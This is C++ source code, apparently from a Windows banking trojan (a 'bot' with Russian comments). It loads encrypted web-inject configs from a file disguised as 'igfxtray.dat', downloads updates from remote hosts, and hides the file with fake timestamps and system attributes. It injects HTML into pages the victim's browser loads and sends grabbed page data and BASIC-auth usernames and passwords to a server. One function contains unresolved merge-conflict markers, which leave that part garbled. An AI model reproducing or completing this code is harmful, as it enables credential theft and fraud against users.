#include <windows.h>

#include "BotConfig.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "Config.h"
#include "BotUtils.h"
#include "Loader.h"

//#include "BotDebug.h"



bool bHttp;
bool bHttps;

// Новая версия конфига
PBotConfig BotConfig;

// Процесс в котором загружался конфиг
DWORD ConfigProcess = 0;

// Время последней загрузки конфига
DWORD LastLoadConfigTime = 0;



LPVOID InjectEventData;       // Данные для вызова события
THTMLInjectEvent InjectEvent; // Обработчик события HTML инжекта


void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event)
{
	// функция устанавливает обработчик события для инжекта HTML
	InjectEventData = Data;
    InjectEvent = Event;
}

void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
{
	// Вызываем событие инжекта
	if (InjectEvent != NULL)
	{
    	InjectEvent(InjectEventData, Sender, ID, Reserved);
	}
}

void GetCurrentConfigHostSetings(bool * http, bool * https)
{
	*http	=	bHttp;
	*https	=	bHttps;
}

PCHAR FgrHostFromCfg = NULL;//1
PCHAR GraHostFromCfg = NULL;//2
PCHAR ScrHostFromCfg = NULL;//3
PCHAR SniHostFromCfg = NULL;//4
PCHAR PluginsHostFromCfg = NULL;//5
DWORD TimeOut=70;

char* GetCurrentHostFromConfig(int Num)
{
	char * Res;
	if (Num==1)Res=FgrHostFromCfg;
	if (Num==2)Res=GraHostFromCfg;
	if (Num==3)Res=ScrHostFromCfg;
	if (Num==4)Res=SniHostFromCfg;
	if (Res==NULL)return NULL;
	char* Domain;
	char *cUrl;
	int i;



	while(true)
	{
		cUrl= m_strstr(Res,"|");
		if (cUrl==NULL)
		{
			Domain=NULL;
			break;
		}
		i=m_lstrlen(Res)-m_lstrlen(cUrl);
		Domain=(char*)MemAlloc(i+1);
		m_memcpy(Domain,Res,i);
		if (!CheckHost(Domain))
		{
			Res+=i+1;
			MemFree(Domain);
		}
		else 
			break;
	}


return Domain;
}

DWORD GetConfigTimeOut()
{
	return TimeOut;
}

//----------------------------------------------------------------------------

PCHAR ReadStrBlock_(PCHAR &Buf)
{
	// Функция читаем строку из буфера и смещает указатель за строку
	// формат буфера (DWORD - Длина строки)(Строка)
	DWORD Size = *(DWORD *)Buf;
	Buf += sizeof(DWORD);
	if (Size == 0)
		return NULL;
	PCHAR Str = StrNew(Buf, Size);
	Buf += Size;
	return Str;
}


bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
{

	//Загрухить конфигурационный файл
	if (BotConfig == NULL || FileName == NULL)
		return false;

	#ifdef DebugUtils
		DebugMessageEx("BotConfig", 0, "Load File", NULL, "Загружаем конфигурационный файл");
	#endif


	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if (File == INVALID_HANDLE_VALUE)
	{
		#ifdef DebugUtils
			DebugMessageEx("BotConfig", 0, "Load File", NULL, "Ошибка загрузки");
		#endif
		return false;

	}



	DWORD h = 0;
	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize);
	if (FileBuf == NULL)
	{
		pCloseHandle(File);
		return false;
	}

	DWORD Readed = 0;
	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
	{
		pCloseHandle(File);
		return false;
	}

	PCHAR Buf = (PCHAR)DecryptBuffer(true, FileBuf, Readed);
	if (Buf == NULL)
	{
		pCloseHandle(File);
		return false;
	}



	// Пропускаем один устаревший параметр размером один байт
	Buf++;

	// определяем количество масок
	DWORD Count = *(DWORD*)Buf;
	Buf += sizeof(DWORD);

	// Загружаем информацию о хостах

	FgrHostFromCfg = ReadStrBlock_(Buf);
	GraHostFromCfg = ReadStrBlock_(Buf);
	ScrHostFromCfg = ReadStrBlock_(Buf);
	SniHostFromCfg = ReadStrBlock_(Buf);
	PluginsHostFromCfg = ReadStrBlock_(Buf);


	// Период обновления конфига
	TimeOut = *(DWORD*)Buf;
	Buf += sizeof( DWORD );


	//------------- Настройки продоколов -------------//
	bHttp = *Buf != 0;
	Buf++;

	bHttps = *Buf != 0;
	Buf++;

	//------------- Загружаем данные инжектов -------------//
	PHTMLInject Inject;
	PHTMLInjectData Data;
	DWORD DataCount;
    DWORD Mode;
	
	for (DWORD i = 0; i < Count; i++)
	{
		Inject = AddHTMLInject(BotConfig->HTMLInjects, NULL);
		if (Inject == NULL)
			break;
		// Читаем маску инжекта	
		Inject->URL = ReadStrBlock_(Buf); 

		// Читаем режимы обработки
		Mode = *(DWORD*)Buf;
		Buf += sizeof(DWORD);

		// Таблица режимов
		// LG  1
		// LP  2
		// GPL  3

		// G   4
		// P   5
		// GP  6
		// Декодируем старую версию флага
		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
		Inject->IsLog = (Mode <= 3); 

		DataCount = *(DWORD *)Buf;
		Buf += sizeof(DWORD);

		for (DWORD j = 0; j < DataCount; j++) 
		{
			Data = AddHTMLInjectData(Inject, NULL, NULL, NULL);
			if (Data == NULL)
				break;

			Data->Before = ReadStrBlock_(Buf);
			Data->Inject = ReadStrBlock_(Buf);
			Data->After = ReadStrBlock_(Buf);
		}
	}
	MemFree(FileBuf);
	pCloseHandle(File);
	#ifdef DebugUtils
		DebugMessageEx("BotConfig", 0, "Load File", NULL, "Готово");
	#endif
	return true;
}
//----------------------------------------------------------------------------

void FreeHTMLInjectData(LPVOID Data)
{
	// Уничтожить данные HTML инжекта
	PHTMLInjectData D = (PHTMLInjectData)Data;
	StrFree(D->Before);
	StrFree(D->After);
	StrFree(D->Inject);
	FreeStruct(D);
}

void FreeHTMLInject(PHTMLInject Inject)
{
	if (Inject == NULL)
		return;

    StrFree(Inject->URL);
	if (Inject->Injects != NULL)
		List::Free(Inject->Injects);
    FreeStruct(Inject);
}

//----------------------------------------------------------------------------
PList CreateHTMLInjectsList()
{
	PList List = List::Create();
	List::SetFreeItemMehod(List, (TFreeItemMethod)FreeHTMLInject);
	return List;
}
//----------------------------------------------------------------------------

PBotConfig CreateConfig()
{
	PBotConfig C = CreateStruct(TBotConfig);
	if (C == NULL)
		return NULL;
	C->HTMLInjects = CreateHTMLInjectsList();
	return C;
}
//----------------------------------------------------------------------------

PHTMLInject AddHTMLInject(PList List, PHTMLInject Source, bool IgnoreDisabledData)
{
	//  Добавить новый HTML инжект в список
	//	List. Если указан источник Source то в новый
	//	будут скопированы все его данные

	PHTMLInject Inject = CreateStruct(THTMLInject);
	if (Inject == NULL)
		return NULL;

	// Копируем инжект
	if (Source != NULL)
	{
		Inject->URL   = StrNew(Source->URL);
		Inject->GET  = Source->GET;
		Inject->POST  = Source->POST;
		Inject->IsLog = Source->IsLog;

		// копируем данные инжектов
		if (Source->Injects != NULL)
		{
			DWORD Count = List::Count(Source->Injects);
			for (DWORD i = 0; i < Count; i++)
			{
				PHTMLInjectData Data = (PHTMLInjectData)List::GetItem(Source->Injects, i);
				if (!Data->Disabled || !IgnoreDisabledData)
				{
					PHTMLInjectData NewData = AddHTMLInjectData(Inject, Data->Before, Data->After, Data->Inject);
					NewData->Source = Data;
                }
			}
		}
    }

	if (List != NULL)
		List::Add(List, Inject);
	return Inject;
}
//----------------------------------------------------------------------------
void ResetHTMLInjectsStatus(PList Injects)
{
	// сбросить статус инжектов
	for (DWORD i = 0; i < List::Count(Injects); i++)
	{
		PHTMLInject Inject = (PHTMLInject)List::GetItem(Injects, i);
		Inject->Used = false;
		for (DWORD j = 0; j < List::Count(Inject->Injects); j++)
		{
			PHTMLInjectData Data = (PHTMLInjectData)List::GetItem(Inject->Injects, j);
			Data->State = idsUnknown;
		}
	}
}
//----------------------------------------------------------------------------


PHTMLInjectData AddHTMLInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject)
{
	//  AddHTMLInjectData - Добавить новые данные инжекта
	if (HTMLInject == NULL)
		return false;

	PHTMLInjectData Data = CreateStruct(THTMLInjectData);
	if (Data == NULL)
		return NULL;

	Data->Before = StrNew(Before);
	Data->After = StrNew(After);
	Data->Inject = StrNew(Inject);

	if (HTMLInject->Injects == NULL)
	{
		HTMLInject->Injects = List::Create();
        List::SetFreeItemMehod(HTMLInject->Injects, FreeHTMLInjectData);
    }

	List::Add(HTMLInject->Injects, Data);
	Data->Owner = HTMLInject;

    return Data;
}
//----------------------------------------------------------------------------

void ClearHTMLInjectList(PList List)
{
	// Функция рчищает список содержащий элементы типа THTMLInject
	if (List == NULL)
		return;
	List::SetFreeItemMehod(List, (TFreeItemMethod)FreeHTMLInject);
    List::Clear(List);
}

//----------------------------------------------------------------------------

bool GetInjectsForRequest(PRequest Request)
{
	//  GetInjectsForRequest - Получить инжекты для запроса
	if (Request == NULL || StrIsEmpty(Request->URL))
		return false;

	// Инициализируем конфигурационный файл
	PBotConfig BotConfig = Config::Initialize(NULL);
	if (BotConfig == NULL)
		return false;

	// Собираем ссылку
	PCHAR URL = Request->URL;
	bool DelURL = false;
	if (Request->Optional != NULL )
	{
		// Добавляем в запрос отправляемые данные
		PCHAR C = NULL;
		if (StrScan(Request->Optional, '?') == NULL) C = "?";
        URL = StrNew(3, Request->URL, C, Request->Optional);
		DelURL = true;
	}

	// Проверяем инжекты
	DWORD Count = List::Count(BotConfig->HTMLInjects);
	for (DWORD i = 0; i < Count; i++)
	{
		PHTMLInject Inject = (PHTMLInject)List::GetItem(BotConfig->HTMLInjects, i);

		if (Inject->Disabled) continue;

		// Сравниваем методы и ссылки
		if ((Request->Method == hmGET && Inject->GET) || (Request->Method == hmPOST && Inject->POST))
			if (CompareUrl(Inject->URL, URL))
			{
                Inject->Used = true;
				CallHTMLInjectEvent(Inject, injMaskFinded, NULL);

<<<<<<< .mine
	//------------- Настройки продоколов -------------//

//	char*Path=GetCurrentHostFromConfig(1);

	//---------------------------------------------------
	if (p[0]=='0')
	{
		bHttp=false;
=======
				if (Request->Injects == NULL)
					Request->Injects = CreateHTMLInjectsList();
				// Дублируем инжект
				PHTMLInject NewInject = AddHTMLInject(Request->Injects, Inject, true);
				if (NewInject != NULL)
				{
                    NewInject->Source = Inject;
					Request->IsInject = true;
                }
			}
>>>>>>> .r109
	}
<<<<<<< .mine
	else
	{
		bHttp=true;
	}
	p += 1;
=======
	//
	if (DelURL)
		StrFree(URL);
>>>>>>> .r109

	return Request->IsInject;
}

//----------------------------------------------------------------------------

WCHAR ConfigFileName[MAX_PATH] = {0};
WCHAR BOT_CONFIG_NAME[] = {'\\','i','g','f','x','t','r','a','y','.','d','a','t',0};

PWCHAR Config::GetFileName()
{
	//  Функция возврашает имя файла по умолчанию
	if (!m_wcslen(ConfigFileName))
	{
		WCHAR *AppPath = GetShellFoldersKey( 2 );

		if ( AppPath == NULL )
			return NULL;

		plstrcpyW(ConfigFileName, AppPath);
		plstrcatW(ConfigFileName, BOT_CONFIG_NAME);
		
		MemFree( AppPath );
	}


	return &ConfigFileName[0];
}

//----------------------------------------------------------------------------
void Config::SetFileName(PWCHAR FileName)
{
	//  Функция устанавливает имя файла по умолчанию
	//DWORD Len = m_wcslen(FileName);
	plstrcpyW(ConfigFileName, FileName);
}

//----------------------------------------------------------------------------
bool Config::Download(PCHAR URL)
{
	if (StrIsEmpty(URL)) return false;	
	bool Ret = false;

	WCHAR *TempFileName = GetTempName();
	WCHAR *CfgPath  = GetFileName();

	if (TempFileName == NULL  || CfgPath == NULL)
		return false;

	// Загружаем файл
	if (DownloadInFile(URL, TempFileName) && FileExistsW(TempFileName))
	{
		HANDLE File	= (HANDLE)pCreateFileW(TempFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
		if (File != INVALID_HANDLE_VALUE)
		{
			char Signature[] = {'B','J','B',0};
			DWORD SignatureLen = 3;

			PCHAR Buf = StrAlloc(SignatureLen);
            DWORD Readed = 0;

			if (pReadFile(File, Buf, SignatureLen, &Readed, NULL))
				Ret = StrSame(Signature, Buf);

			StrFree(Buf);
            pCloseHandle(File);
		}

		if (Ret)
		{
            // Копируем файл на постоянное место локации
			pSetFileAttributesW(CfgPath, FILE_ATTRIBUTE_ARCHIVE );
			pMoveFileExW(TempFileName, CfgPath, MOVEFILE_REPLACE_EXISTING);
			SetFakeFileDateTime( CfgPath );
			pSetFileAttributesW( CfgPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
		}
        pDeleteFileW(TempFileName);
	}

	return Ret;
}
//----------------------------------------------------------------------------

PBotConfig Config::Initialize(PWCHAR FileName, bool DontLoad)
{
	// Инициализировать глобальные настройки работы бота
	if (IsNewProcess(ConfigProcess))
	{
		// Обращение в новом процессе
		BotConfig = NULL;
		LastLoadConfigTime = 0;
	}

	if (BotConfig == NULL)
	{
		BotConfig = CreateConfig();
		if (!DontLoad)
		{
			if (FileName == NULL)
				FileName = GetFileName();
			
			LoadConfigFromFileEx(BotConfig, FileName);
			LastLoadConfigTime = (DWORD)pGetTickCount();
		}
    }

    return BotConfig;
}
//----------------------------------------------------------------------------


PBotConfig Config::GetConfig()
{
	// Функция возвращает на конфиг бота
	return BotConfig;
}
//----------------------------------------------------------------------------

void Config::Clear(PBotConfig Config)
{
	// Очистить данне конфига
	if (Config == NULL)
        Config = BotConfig;
	if (Config != NULL)
		List::Clear(Config->HTMLInjects);
}
//----------------------------------------------------------------------------

bool HTMLInjects::IsValidInjectData(PHTMLInjectData Data)
{
	// Функция возвращает истину если данные поддерживаются
	// методом инжекта
	if (Data == NULL)
		return false;

	bool B = !StrIsEmpty(Data->Before);
	bool I = !StrIsEmpty(Data->Inject);
	bool A = !StrIsEmpty(Data->After);

	return (B && I && A) ||
		   (B && A) ||
		   (B && I) ||
		   (I && A);

}
//----------------------------------------------------------------------------

bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before, PCHAR Inject, PCHAR After)
{
	// Функция вставляет текст Inject между текстом Before и After
	if (Buffer == NULL) return false;

	bool B = !StrIsEmpty(Before);
	bool A = !StrIsEmpty(After);
	bool I = !StrIsEmpty(Inject);

	bool Valid = (B && I && A) ||
				 (B && A) ||
				 (B && I) ||
				 (I && A);

	if (!Valid)
		return false;


	// Позиция блока Иуащку
	DWORD BStart = 0;
	DWORD BEnd = 0;
	DWORD BLen = 0;
    // Позиция блока After
	DWORD AStart = 0;
	DWORD AEnd = 0;
	DWORD ALen = 0;

	PCHAR AfterPtr = NULL;

	// Ищем блок Before
	if (B)
	{
		if (!WildCmp(Buffer, Before, &BStart, &BEnd, &BLen))
			return false;
    }



	// Ищем блок After
	if (A)
	{
		PCHAR BeforePtr = Buffer + BEnd;
		if (!WildCmp(BeforePtr, After, &AStart, &AEnd, &ALen))
			return false;
		AfterPtr = BeforePtr + AStart;
		// Если не указан блок Before то переносим конец блока на начало
		// блока After
		if (!B) BEnd = AStart;
	}
	else
    	AfterPtr = Buffer + BEnd; // Ставим указатель на конец блока Before

    DWORD InjectLen = StrCalcLength(Inject);
	DWORD AfterLen = StrCalcLength(AfterPtr);

	// Создаём новый буфер
	DWORD NewBufLen = BEnd + InjectLen + AfterLen;
	PCHAR Buf = (PCHAR)MemAlloc(NewBufLen + 1);
	if (Buf == NULL) return false;

	NewBuffer = Buf;

	// Копируем строки
	m_memcpy(Buf, Buffer, BEnd);
	Buf += BEnd;
	m_memcpy(Buf, Inject, InjectLen);
	Buf += InjectLen;
	m_memcpy(Buf, AfterPtr, AfterLen);
	Buf += AfterLen;
    *Buf = 0;

    return true;
}
//----------------------------------------------------------------------------

PCHAR GetHTMLLogCode(PCHAR Buffer, PHTMLInject Inject)
{
	// Функция возвращает HTML код согласно настроек инжекта
	if (StrIsEmpty(Buffer) || Inject == NULL)
		return NULL;

	PStrings S = Strings::Create();
	bool Added = false;
	PCHAR Code;
	PCHAR Tmp;
	DWORD Count = List::Count(Inject->Injects);
	PHTMLInjectData Data;

	for (DWORD i = 0; i < Count; i++)
	{
		Data = (PHTMLInjectData)List::GetItem(Inject->Injects, i);
		Code = GetTextBetween(Buffer, Data->Before, Data->After);
		if (Code != NULL)
		{
			Added = true;
			if (!StrIsEmpty(Data->Inject))
			{
				Tmp = Code;
				Code = StrNew(3, Data->Inject, ": ", Tmp);
				StrFree(Tmp);
			}
			Strings::Add(S, Code, false);

			Data->State = idsOk;
			CallHTMLInjectEvent(Data->Source, injDataHandled, NULL);
        }
    }
	PCHAR Result = NULL;

	if (Added)
		Result = Strings::GetText(S, " ");

	Strings::Free(S);
    return Result;
}

//----------------------------------------------------------------------------

bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject, PHTTPSessionInfo Session)
{
	// Функция отправляет блоки HTML на указанный в настройках сервер
	if (Inject == NULL || !Inject->IsLog)
		return false;


	// Получаем необходимые данные
	PCHAR SendBuffer = NULL;

	PCHAR Data = GetHTMLLogCode(Buffer, Inject);

	if (Data == NULL)
		return false;


	DWORD BrowserType = 0;
	PCHAR UserAgent = NULL;
	PCHAR URL = NULL;

	if (Session != NULL)
	{
		BrowserType = Session->BrowserType;
		UserAgent = Session->UserAgent;

		// Дополняем данные информацией о загружаемом адресе
		if (Session->URL)
		{
			URL = Session->URL;
			StrConcat(SendBuffer, 3, Session->URL, "|", Data);
			StrFree(Data);
        }

	}

	if (SendBuffer == NULL)
		SendBuffer = Data;

	//  Отправляем  полученные данные
	SendFormGrabberLogs(URL, SendBuffer, UserAgent, BrowserType, DATA_TYPE_INJECT);

	StrFree(SendBuffer);

	return true;
}
//----------------------------------------------------------------------------

bool InjectHTMLCode(PCHAR Buffer, PCHAR &RetBuffer, PHTMLInject Inject)
{
	// Метод обрабатывает загруженный HTML документ
    RetBuffer = NULL;

	if (Inject == NULL || Buffer == NULL)
		return false;

	PCHAR NewBuffer = NULL;
    PCHAR WorkBuf = Buffer;

	DWORD Count = List::Count(Inject->Injects);
	PHTMLInjectData Data;
	bool Injected = false; // Признак того, что был произведён хотя-бы один инжект

	#ifdef DebugUtils
		DebugMessageEx("BotConfig", 0, "HTMLInject", NULL, "=================================================================");
		DebugMessageEx("BotConfig", 0, "HTMLInject", Inject->URL, "Адрес инжекта");
		DebugMessageEx("BotConfig", 0, "HTMLInject", Buffer, "Исходный код");
	#endif

	for (DWORD i = 0; i < Count; i++)
	{
		Data = (PHTMLInjectData)List::GetItem(Inject->Injects, i);

		// Обработанные данные игнорируем
		if (Data->Disabled || Data->State == idsOk) continue;

		//  Инжектим HTML код в документ
		if (SubstitudeText2(WorkBuf, NewBuffer, Data->Before, Data->Inject, Data->After))
		{
			// Инжект сработал, обрабатываем данные
		#ifdef DebugUtils
			DebugMessageEx("BotConfig", 0, "HTMLInject", NULL, "Сработал");
			DebugMessageEx("BotConfig", 0, "HTMLInject", NewBuffer, "Результирующий документ");
			DebugMessageEx("BotConfig", 0, "HTMLInject", NULL, "----------------------------------------------------");
		#endif


			Injected = true;
			if (RetBuffer != NULL)
				MemFree(RetBuffer);
			RetBuffer = NewBuffer;
            WorkBuf = NewBuffer;
			NewBuffer = NULL;

			Data->State = idsOk;
			if (Data->Source != NULL)
                PHTMLInjectData(Data->Source)->State = idsOk;
		}
		else
			Data->State = idsError;

		CallHTMLInjectEvent(Data->Source, injDataHandled, NULL);
	}

	if (NewBuffer != NULL)
		MemFree(NewBuffer);
    return Injected;

}

//----------------------------------------------------------------------------

bool HandleHTMLinjects(PRequest Request, PHTTPSessionInfo Session)
{
	//  Обработать HTML инжекты.
	//
	//  функция возвращает истину если в буффер
	//  запроса были внесены изменения

	if (Request == NULL || !Request->IsInject)
		return false;

	bool Result = false;
	PHTMLInject Inject;
	PCHAR NewBuffer;
	DWORD Count = List::Count(Request->Injects);

	for (DWORD i = 0; i < Count; i++)
	{
		Inject = (PHTMLInject)List::GetItem(Request->Injects, i);
		if (Inject->IsLog)
			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
		 else
		 {
			// Внедряем свой код в загруженные данные
			NewBuffer = NULL;
			if (InjectHTMLCode((PCHAR)Request->Buffer, NewBuffer, Inject) && NewBuffer != NULL)
			{
			
				Result = true;
                SetRequestBuffer(Request, (LPBYTE)NewBuffer, 0, false);
            }
         }

	}

	return Result;

}
//----------------------------------------------------------------------------

void SendBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password)
{
	// Функция отправляет на сервер данные BASIC авторизации
	PCHAR SendBuf = StrNew(8, Session->URL, "|", "POST:", "username=", UserName, "&", "password=", Password);

	SendFormGrabberLogs(Session->URL,SendBuf, Session->UserAgent, Session->BrowserType, DATA_TYPE_FORMGRAB);

	StrFree(SendBuf);
}
//----------------------------------------------------------------------------

bool SupportContentType(PCHAR CType)
{
	// Функция возвращает истину если указанный тип контента
	// поддерживается методами инжекта HTML
	if (CType == NULL)
		return false;
	if (StrSame(CType, "text/", false, 5))
		return true;

	PCHAR Temp;
    bool FreeStr = false;
	if (StrScan(CType, ';') != NULL)
	{
		Temp = STR::GetLeftStr(CType, ";");
		FreeStr = true;
    }
	else
		Temp = CType;

 	int Result = StrIndexOf(Temp, false, 1, "application/x-javascript");
	if (FreeStr)
		StrFree(Temp);
    return Result >= 0;
}
//----------------------------------------------------------------------------
